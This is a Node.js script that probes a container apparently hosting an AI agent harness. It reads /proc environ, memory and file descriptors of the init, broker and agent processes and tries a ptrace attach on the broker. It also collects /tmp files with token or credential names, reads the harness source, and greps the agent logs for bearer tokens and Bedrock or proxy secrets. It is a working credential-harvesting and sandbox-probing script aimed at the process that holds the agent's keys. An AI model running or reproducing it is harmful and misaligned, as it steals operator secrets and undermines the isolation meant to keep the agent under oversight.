const fs = require("node:fs");
const { spawnSync } = require("node:child_process");

function fact(file, max = 2 * 1024 * 1024) {
  const row = { path: file };
  try {
    const st = fs.lstatSync(file);
    Object.assign(row, {
      exists: true,
      mode: (st.mode & 0o7777).toString(8),
      uid: st.uid,
      gid: st.gid,
      size: st.size,
      kind: st.isDirectory() ? "directory" : st.isSymbolicLink() ? "symlink" : st.isFile() ? "file" : "other",
    });
    if (st.isSymbolicLink()) row.link = fs.readlinkSync(file);
    if (st.isDirectory()) row.entries = fs.readdirSync(file).slice(0, 1000);
    if (st.isFile() && st.size <= max) row.content_base64 = fs.readFileSync(file).toString("base64");
  } catch (error) {
    row.exists = false;
    row.error = error.code || String(error);
  }
  return row;
}

function run(command, args = [], timeout = 10000) {
  const result = spawnSync(command, args, { encoding: "utf8", timeout, maxBuffer: 4 * 1024 * 1024 });
  return { command: [command, ...args], status: result.status, signal: result.signal, error: result.error ? String(result.error) : null, stdout: result.stdout || "", stderr: result.stderr || "" };
}

const procFiles = [];
for (const pid of ["1", "20", "22", String(process.pid)]) {
  for (const name of ["environ", "cmdline", "status", "stat", "attr/current", "loginuid", "cgroup", "mem", "root", "cwd", "exe", "fd", "fdinfo", "ns"]) {
    procFiles.push(fact(`/proc/${pid}/${name}`));
  }
}

const tmpFiles = [];
for (const name of fs.readdirSync("/tmp")) {
  const file = `/tmp/${name}`;
  const st = fact(file, 0);
  if (st.kind === "file" || st.kind === "symlink" || /agent|token|credential|broker|proxy|env|auth|secret/i.test(name)) tmpFiles.push(st);
}

const appFiles = [
  "/app/vega_agentcore/supervisor.py",
  "/app/vega_agentcore/broker.py",
  "/app/vega_agentcore/forwarded_headers.py",
  "/app/vega_agentcore/opencode_config.py",
].map((file) => fact(file, 0));

const py = String.raw`
import ctypes, ctypes.util, json, os
libc=ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
PTRACE_ATTACH=16
PTRACE_DETACH=17
r=libc.ptrace(PTRACE_ATTACH, 20, None, None)
e=ctypes.get_errno()
out={'attach_result':r,'attach_errno':e,'attach_error':os.strerror(e)}
if r==0:
    os.waitpid(20,0)
    out['detach_result']=libc.ptrace(PTRACE_DETACH,20,None,None)
print(json.dumps(out))
`;

const result = {
  proc_files: procFiles,
  tmp_files: tmpFiles,
  app_files: appFiles,
  ptrace_broker: run("python3", ["-c", py]),
  proc20_signal_probe: run("sh", ["-lc", "kill -0 20"]),
  proc20_fd_listing: run("sh", ["-lc", "for x in /proc/20/fd/*; do printf '%s -> ' \"$x\"; readlink \"$x\" || true; done"]),
  proc1_fd_listing: run("sh", ["-lc", "for x in /proc/1/fd/*; do printf '%s -> ' \"$x\"; readlink \"$x\" || true; done"]),
  process_envs: {
    pid1: run("sh", ["-lc", "tr '\\0' '\\n' </proc/1/environ"]),
    broker: run("sh", ["-lc", "tr '\\0' '\\n' </proc/20/environ"]),
    agent: run("sh", ["-lc", "tr '\\0' '\\n' </proc/22/environ"]),
  },
  agent_logs_secret_scan: run("sh", ["-lc", "grep -aEin 'token|credential|authorization|secret|bearer|bedrock|proxy' /tmp/.agent_stdout /tmp/.agent_stderr 2>/dev/null | tail -500"]),
};

console.log(`BROKER_PROCESS_FACTS=${JSON.stringify(result)}`);
console.log("BROKER_PROCESS_PROBE_COMPLETE=true");
